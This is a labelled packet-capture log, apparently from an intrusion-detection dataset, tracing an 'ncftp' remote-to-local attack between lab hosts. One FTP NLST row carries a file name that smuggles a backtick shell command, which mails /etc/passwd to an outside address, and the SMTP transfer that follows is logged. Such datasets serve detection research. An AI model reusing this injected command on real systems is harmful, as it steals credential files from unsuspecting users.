"ncftp"," r2l", "3017654","21:45:13.323504","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017655","21:45:13.342966","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=145 Ack=687 Win=32120 Len=0"
"ncftp"," r2l", "3017656","21:45:13.343143","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017657","21:45:13.343495","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017658","21:45:13.362963","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=146 Ack=688 Win=32120 Len=0"
"ncftp"," r2l", "3017659","21:45:13.373078","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017660","21:45:13.373429","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017661","21:45:13.392954","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=147 Ack=689 Win=32120 Len=0"
"ncftp"," r2l", "3017662","21:45:13.403072","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017663","21:45:13.403423","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017664","21:45:13.422950","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=148 Ack=690 Win=32120 Len=0"
"ncftp"," r2l", "3017665","21:45:13.423130","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017666","21:45:13.423482","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017667","21:45:13.442945","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=149 Ack=691 Win=32120 Len=0"
"ncftp"," r2l", "3017668","21:45:13.444633","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017669","21:45:13.444966","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017670","21:45:13.445359","172.16.114.50","172.16.118.20","FTP","81","Request: PORT 172,16,114,50,24,118"
"ncftp"," r2l", "3017671","21:45:13.446061","172.16.118.20","172.16.114.50","FTP","84","Response: 200 PORT command successful."
"ncftp"," r2l", "3017672","21:45:13.446391","172.16.114.50","172.16.118.20","FTP","70","Request: LIST -d y2kfix"
"ncftp"," r2l", "3017673","21:45:13.448041","172.16.118.20","172.16.114.50","TCP","60","20 → 6262 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "3017674","21:45:13.448305","172.16.114.50","172.16.118.20","TCP","60","6262 → 20 [SYN, ACK] Seq=0 Ack=1 Win=31744 Len=0 MSS=1460"
"ncftp"," r2l", "3017675","21:45:13.448703","172.16.118.20","172.16.114.50","TCP","60","20 → 6262 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017676","21:45:13.453177","172.16.118.20","172.16.114.50","FTP","107","Response: 150 Opening ASCII mode data connection for /bin/ls."
"ncftp"," r2l", "3017677","21:45:13.462940","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=151 Ack=693 Win=32120 Len=0"
"ncftp"," r2l", "3017678","21:45:13.473066","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=193 Ack=657 Win=31744 Len=0"
"ncftp"," r2l", "3017679","21:45:13.633261","172.16.118.20","172.16.114.50","FTP-DATA","117","FTP Data: 63 bytes"
"ncftp"," r2l", "3017680","21:45:13.633342","172.16.118.20","172.16.114.50","FTP","78","Response: 226 Transfer complete."
"ncftp"," r2l", "3017681","21:45:13.633414","172.16.118.20","172.16.114.50","TCP","60","20 → 6262 [FIN, ACK] Seq=64 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017682","21:45:13.633627","172.16.114.50","172.16.118.20","TCP","60","6262 → 20 [ACK] Seq=1 Ack=65 Win=31744 Len=0"
"ncftp"," r2l", "3017683","21:45:13.633772","172.16.114.50","172.16.118.20","TCP","60","6262 → 20 [FIN, ACK] Seq=1 Ack=65 Win=31744 Len=0"
"ncftp"," r2l", "3017684","21:45:13.634168","172.16.114.50","172.16.118.20","FTP","81","Request: PORT 172,16,114,50,24,127"
"ncftp"," r2l", "3017685","21:45:13.634239","172.16.118.20","172.16.114.50","TCP","60","20 → 6262 [ACK] Seq=65 Ack=2 Win=32120 Len=0"
"ncftp"," r2l", "3017686","21:45:13.634807","172.16.118.20","172.16.114.50","FTP","84","Response: 200 PORT command successful."
"ncftp"," r2l", "3017687","21:45:13.635125","172.16.114.50","172.16.118.20","FTP","75","Request: NLST -F /pub/y2kfix"
"ncftp"," r2l", "3017688","21:45:13.636662","172.16.118.20","172.16.114.50","TCP","60","20 → 6271 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "3017689","21:45:13.636906","172.16.114.50","172.16.118.20","TCP","60","6271 → 20 [SYN, ACK] Seq=0 Ack=1 Win=31744 Len=0 MSS=1460"
"ncftp"," r2l", "3017690","21:45:13.637318","172.16.118.20","172.16.114.50","TCP","60","20 → 6271 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017691","21:45:13.641514","172.16.118.20","172.16.114.50","FTP","107","Response: 150 Opening ASCII mode data connection for /bin/ls."
"ncftp"," r2l", "3017692","21:45:13.653026","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=241 Ack=764 Win=31744 Len=0"
"ncftp"," r2l", "3017693","21:45:13.655746","172.16.118.20","172.16.114.50","FTP-DATA","87","FTP Data: 33 bytes"
"ncftp"," r2l", "3017694","21:45:13.655849","172.16.118.20","172.16.114.50","FTP","78","Response: 226 Transfer complete."
"ncftp"," r2l", "3017695","21:45:13.655919","172.16.118.20","172.16.114.50","TCP","60","20 → 6271 [FIN, ACK] Seq=34 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017696","21:45:13.656134","172.16.114.50","172.16.118.20","TCP","60","6271 → 20 [ACK] Seq=1 Ack=35 Win=31744 Len=0"
"ncftp"," r2l", "3017697","21:45:13.657501","172.16.114.50","172.16.118.20","TCP","60","6271 → 20 [FIN, ACK] Seq=1 Ack=35 Win=31744 Len=0"
"ncftp"," r2l", "3017698","21:45:13.657695","172.16.114.50","172.16.118.20","FTP","62","Request: TYPE I"
"ncftp"," r2l", "3017699","21:45:13.657908","172.16.118.20","172.16.114.50","TCP","60","20 → 6271 [ACK] Seq=35 Ack=2 Win=32120 Len=0"
"ncftp"," r2l", "3017700","21:45:13.658292","172.16.118.20","172.16.114.50","FTP","74","Response: 200 Type set to I."
"ncftp"," r2l", "3017701","21:45:13.658601","172.16.114.50","172.16.118.20","FTP","80","Request: SIZE /pub/y2kfix/INSTALL"
"ncftp"," r2l", "3017702","21:45:13.659250","172.16.118.20","172.16.114.50","FTP","63","Response: 213 120"
"ncftp"," r2l", "3017703","21:45:13.659559","172.16.114.50","172.16.118.20","FTP","80","Request: MDTM /pub/y2kfix/INSTALL"
"ncftp"," r2l", "3017704","21:45:13.660256","172.16.118.20","172.16.114.50","FTP","74","Response: 213 19990327070346"
"ncftp"," r2l", "3017705","21:45:13.661843","172.16.114.50","172.16.118.20","TELNET","89","Telnet Data ..."
"ncftp"," r2l", "3017706","21:45:13.662003","172.16.114.50","172.16.118.20","FTP","81","Request: SIZE /pub/y2kfix/Makefile"
"ncftp"," r2l", "3017707","21:45:13.662712","172.16.118.20","172.16.114.50","FTP","64","Response: 213 2431"
"ncftp"," r2l", "3017708","21:45:13.663052","172.16.114.50","172.16.118.20","FTP","81","Request: MDTM /pub/y2kfix/Makefile"
"ncftp"," r2l", "3017709","21:45:13.663704","172.16.118.20","172.16.114.50","FTP","74","Response: 213 19990327071106"
"ncftp"," r2l", "3017710","21:45:13.665136","172.16.114.50","172.16.118.20","FTP","79","Request: SIZE /pub/y2kfix/README"
"ncftp"," r2l", "3017711","21:45:13.665741","172.16.118.20","172.16.114.50","FTP","63","Response: 213 103"
"ncftp"," r2l", "3017712","21:45:13.666057","172.16.114.50","172.16.118.20","FTP","79","Request: MDTM /pub/y2kfix/README"
"ncftp"," r2l", "3017713","21:45:13.666704","172.16.118.20","172.16.114.50","FTP","74","Response: 213 19990327070507"
"ncftp"," r2l", "3017714","21:45:13.668375","172.16.114.50","172.16.118.20","FTP","62","Request: TYPE A"
"ncftp"," r2l", "3017715","21:45:13.668942","172.16.118.20","172.16.114.50","FTP","74","Response: 200 Type set to A."
"ncftp"," r2l", "3017716","21:45:13.669408","172.16.114.50","172.16.118.20","FTP","81","Request: PORT 172,16,114,50,24,178"
"ncftp"," r2l", "3017717","21:45:13.670037","172.16.118.20","172.16.114.50","FTP","84","Response: 200 PORT command successful."
"ncftp"," r2l", "3017718","21:45:13.670363","172.16.114.50","172.16.118.20","FTP","79","Request: NLST -F /pub/y2kfix/src"
"ncftp"," r2l", "3017719","21:45:13.671841","172.16.118.20","172.16.114.50","TCP","60","20 → 6322 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "3017720","21:45:13.672084","172.16.114.50","172.16.118.20","TCP","60","6322 → 20 [SYN, ACK] Seq=0 Ack=1 Win=31744 Len=0 MSS=1460"
"ncftp"," r2l", "3017721","21:45:13.672479","172.16.118.20","172.16.114.50","TCP","60","20 → 6322 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017722","21:45:13.672872","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=151 Ack=728 Win=32120 Len=0"
"ncftp"," r2l", "3017723","21:45:13.673157","172.16.114.50","172.16.118.20","TELNET","124","Telnet Data ..."
"ncftp"," r2l", "3017724","21:45:13.673628","172.16.118.20","172.16.114.50","FTP","107","Response: 150 Opening ASCII mode data connection for /bin/ls."
"ncftp"," r2l", "3017725","21:45:13.684173","172.16.118.20","172.16.114.50","FTP-DATA","217","FTP Data: 163 bytes"
"ncftp"," r2l", "3017726","21:45:13.684240","172.16.118.20","172.16.114.50","TCP","60","20 → 6322 [FIN, ACK] Seq=164 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017727","21:45:13.684523","172.16.114.50","172.16.118.20","TCP","60","6322 → 20 [ACK] Seq=1 Ack=165 Win=31744 Len=0"
"ncftp"," r2l", "3017728","21:45:13.684969","172.16.114.50","172.16.118.20","TCP","60","6322 → 20 [FIN, ACK] Seq=1 Ack=165 Win=31744 Len=0"
"ncftp"," r2l", "3017729","21:45:13.685370","172.16.118.20","172.16.114.50","TCP","60","20 → 6322 [ACK] Seq=165 Ack=2 Win=32120 Len=0"
"ncftp"," r2l", "3017730","21:45:13.692870","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=151 Ack=798 Win=32120 Len=0"
"ncftp"," r2l", "3017731","21:45:13.693085","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=465 Ack=999 Win=31744 Len=0"
"ncftp"," r2l", "3017732","21:45:13.693516","172.16.118.20","172.16.114.50","FTP","78","Response: 226 Transfer complete."
"ncftp"," r2l", "3017733","21:45:13.713049","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=465 Ack=1023 Win=31744 Len=0"
"ncftp"," r2l", "3017734","21:45:13.799260","172.16.114.50","172.16.112.20","DNS","79","Standard query 0xf7fb ANY linux2.eyrie.af.mil"
"ncftp"," r2l", "3017735","21:45:13.800316","172.16.112.20","172.16.114.50","DNS","176","Standard query response 0xf7fb ANY linux2.eyrie.af.mil MX 10 linux2.eyrie.af.mil A 172.16.118.20 NS hobbes.eyrie.af.mil A 172.16.118.20 A 172.16.112.20"
"ncftp"," r2l", "3017736","21:45:14.176937","172.16.114.50","172.16.118.20","FTP","81","Request: PORT 172,16,114,50,24,181"
"ncftp"," r2l", "3017737","21:45:14.177717","172.16.114.50","172.16.112.20","DNS","79","Standard query 0xf7fc MX linux2.eyrie.af.mil"
"ncftp"," r2l", "3017738","21:45:14.177876","172.16.118.20","172.16.114.50","FTP","84","Response: 200 PORT command successful."
"ncftp"," r2l", "3017739","21:45:14.178475","172.16.114.50","172.16.118.20","FTP","240","Request: NLST -F /pub/y2kfix/src/`echo -e sed 's\057\134(\w\134)\057--\1341\057g' \057etc\057passwd|sed 's\057:\057KK\057g'|\057usr\057lib\057sendmail lucyj@linux2.eyrie.af.mil">x;. x;rm -f x`""
"ncftp"," r2l", "3017740","21:45:14.179028","172.16.112.20","172.16.114.50","DNS","160","Standard query response 0xf7fc MX linux2.eyrie.af.mil MX 10 linux2.eyrie.af.mil NS hobbes.eyrie.af.mil A 172.16.118.20 A 172.16.112.20"
"ncftp"," r2l", "3017741","21:45:14.179921","172.16.114.50","172.16.112.20","DNS","79","Standard query 0xf7fd A linux2.eyrie.af.mil"
"ncftp"," r2l", "3017742","21:45:14.180801","172.16.112.20","172.16.114.50","DNS","144","Standard query response 0xf7fd A linux2.eyrie.af.mil A 172.16.118.20 NS hobbes.eyrie.af.mil A 172.16.112.20"
"ncftp"," r2l", "3017743","21:45:14.180874","172.16.118.20","172.16.114.50","TCP","60","20 → 6325 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "3017744","21:45:14.181232","172.16.114.50","172.16.118.20","TCP","60","6325 → 20 [SYN, ACK] Seq=0 Ack=1 Win=31744 Len=0 MSS=1460"
"ncftp"," r2l", "3017745","21:45:14.181658","172.16.118.20","172.16.114.50","TCP","60","20 → 6325 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017746","21:45:14.181961","172.16.114.50","172.16.118.20","TCP","60","6334 → 25 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "3017747","21:45:14.182403","172.16.118.20","172.16.114.50","TCP","60","25 → 6334 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "3017748","21:45:14.182630","172.16.114.50","172.16.118.20","TCP","60","6334 → 25 [ACK] Seq=1 Ack=1 Win=31744 Len=0"
"ncftp"," r2l", "3017749","21:45:14.186995","172.16.118.20","172.16.114.50","FTP","107","Response: 150 Opening ASCII mode data connection for /bin/ls."
"ncftp"," r2l", "3017750","21:45:14.192388","172.16.118.20","172.16.114.50","TCP","60","1305 → 113 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "3017751","21:45:14.192639","172.16.114.50","172.16.118.20","TCP","60","113 → 1305 [SYN, ACK] Seq=0 Ack=1 Win=31744 Len=0 MSS=1460"
"ncftp"," r2l", "3017752","21:45:14.193071","172.16.118.20","172.16.114.50","TCP","60","1305 → 113 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017753","21:45:14.193198","172.16.118.20","172.16.114.50","TCP","63","1305 → 113 [PSH, ACK] Seq=1 Ack=1 Win=32120 Len=9"
"ncftp"," r2l", "3017754","21:45:14.195294","172.16.118.20","172.16.114.50","TCP","60","20 → 6325 [FIN, ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017755","21:45:14.195531","172.16.114.50","172.16.118.20","TCP","60","6325 → 20 [ACK] Seq=1 Ack=2 Win=31744 Len=0"
"ncftp"," r2l", "3017756","21:45:14.195674","172.16.114.50","172.16.118.20","TCP","60","6325 → 20 [FIN, ACK] Seq=1 Ack=2 Win=31744 Len=0"
"ncftp"," r2l", "3017757","21:45:14.196075","172.16.118.20","172.16.114.50","TCP","60","20 → 6325 [ACK] Seq=2 Ack=2 Win=32120 Len=0"
"ncftp"," r2l", "3017758","21:45:14.200523","172.16.114.50","172.16.112.20","DNS","86","Standard query 0x6cd7 PTR 20.118.16.172.in-addr.arpa"
"ncftp"," r2l", "3017759","21:45:14.201437","172.16.112.20","172.16.114.50","DNS","175","Standard query response 0x6cd7 PTR 20.118.16.172.in-addr.arpa PTR linux2.eyrie.af.mil NS hobbes.eyrie.af.mil A 172.16.112.20"
"ncftp"," r2l", "3017760","21:45:14.202183","172.16.114.50","172.16.112.20","DNS","79","Standard query 0x6cd8 A linux2.eyrie.af.mil"
"ncftp"," r2l", "3017761","21:45:14.202702","172.16.112.20","172.16.114.50","DNS","144","Standard query response 0x6cd8 A linux2.eyrie.af.mil A 172.16.118.20 NS hobbes.eyrie.af.mil A 172.16.112.20"
"ncftp"," r2l", "3017762","21:45:14.202977","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=678 Ack=1106 Win=31744 Len=0"
"ncftp"," r2l", "3017763","21:45:14.203410","172.16.118.20","172.16.114.50","FTP","78","Response: 226 Transfer complete."
"ncftp"," r2l", "3017764","21:45:14.204340","172.16.114.50","172.16.118.20","TELNET","66","Telnet Data ..."
"ncftp"," r2l", "3017765","21:45:14.207078","172.16.114.50","172.16.118.20","TCP","90","113 → 1305 [PSH, ACK] Seq=1 Ack=10 Win=31744 Len=36"
"ncftp"," r2l", "3017766","21:45:14.207338","172.16.114.50","172.16.118.20","TCP","60","113 → 1305 [FIN, ACK] Seq=37 Ack=10 Win=31744 Len=0"
"ncftp"," r2l", "3017767","21:45:14.207565","172.16.118.20","172.16.114.50","TCP","60","1305 → 113 [FIN, ACK] Seq=10 Ack=37 Win=32120 Len=0"
"ncftp"," r2l", "3017768","21:45:14.207778","172.16.118.20","172.16.114.50","TCP","60","1305 → 113 [ACK] Seq=11 Ack=38 Win=32120 Len=0"
"ncftp"," r2l", "3017769","21:45:14.207848","172.16.114.50","172.16.118.20","TCP","60","113 → 1305 [ACK] Seq=38 Ack=11 Win=31744 Len=0"
"ncftp"," r2l", "3017770","21:45:14.208573","172.16.118.20","172.16.114.50","SMTP","138","S: 220 linux2.eyrie.af.mil ESMTP Sendmail 8.8.7/8.8.7; Tue, 6 Apr 1999 21:45:31 -0400"
"ncftp"," r2l", "3017771","21:45:14.209055","172.16.114.50","172.16.118.20","SMTP","78","C: EHLO marx.eyrie.af.mil"
"ncftp"," r2l", "3017772","21:45:14.210024","172.16.118.20","172.16.114.50","SMTP","239","S: 250 linux2.eyrie.af.mil Hello bramy@marx.eyrie.af.mil [172.16.114.50], pleased to meet you | 250 EXPN | 250 VERB | 250 8BITMIME | 250 SIZE | 250 DSN | 250 ONEX | 250 ETRN | 250 XUSR | 250 HELP"
"ncftp"," r2l", "3017773","21:45:14.210963","172.16.114.50","172.16.118.20","SMTP","102","C: MAIL From:<bramy@marx.eyrie.af.mil> SIZE=21709"
"ncftp"," r2l", "3017774","21:45:14.218571","172.16.118.20","172.16.114.50","SMTP","98","S: 250 <bramy@marx.eyrie.af.mil>... Sender ok"
"ncftp"," r2l", "3017775","21:45:14.218937","172.16.114.50","172.16.118.20","SMTP","91","C: RCPT To:<lucyj@linux2.eyrie.af.mil>"
"ncftp"," r2l", "3017776","21:45:14.222744","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=151 Ack=810 Win=32120 Len=0"
"ncftp"," r2l", "3017777","21:45:14.222957","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=678 Ack=1130 Win=31744 Len=0"
"ncftp"," r2l", "3017778","21:45:14.232732","172.16.118.20","172.16.114.50","TCP","60","25 → 6334 [ACK] Seq=314 Ack=110 Win=32736 Len=0"
"ncftp"," r2l", "3017779","21:45:14.252255","172.16.118.20","172.16.114.50","SMTP","103","S: 250 <lucyj@linux2.eyrie.af.mil>... Recipient ok"
"ncftp"," r2l", "3017780","21:45:14.252603","172.16.114.50","172.16.118.20","SMTP","60","C: DATA"
"ncftp"," r2l", "3017781","21:45:14.253724","172.16.118.20","172.16.114.50","SMTP","104","S: 354 Enter mail, end with ." on a line by itself""
"ncftp"," r2l", "3017782","21:45:14.256042","172.16.114.50","172.16.118.20","SMTP","1078","C: DATA fragment, 1024 bytes"
"ncftp"," r2l", "3017783","21:45:14.257456","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017784","21:45:14.258713","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017785","21:45:14.259975","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017786","21:45:14.261243","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017787","21:45:14.262502","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017788","21:45:14.262783","172.16.118.20","172.16.114.50","TCP","60","25 → 6334 [ACK] Seq=413 Ack=5520 Win=32736 Len=0"
"ncftp"," r2l", "3017789","21:45:14.264579","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017790","21:45:14.265840","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017791","21:45:14.267111","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017792","21:45:14.268369","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017793","21:45:14.269630","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017794","21:45:14.272719","172.16.118.20","172.16.114.50","TCP","60","25 → 6334 [ACK] Seq=413 Ack=15740 Win=32736 Len=0"
"ncftp"," r2l", "3017795","21:45:14.274513","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017796","21:45:14.275771","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017797","21:45:14.277033","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017798","21:45:14.278291","172.16.114.50","172.16.118.20","SMTP","1514","C: DATA fragment, 1460 bytes"
"ncftp"," r2l", "3017799","21:45:14.282711","172.16.118.20","172.16.114.50","TCP","60","25 → 6334 [ACK] Seq=413 Ack=21580 Win=32736 Len=0"
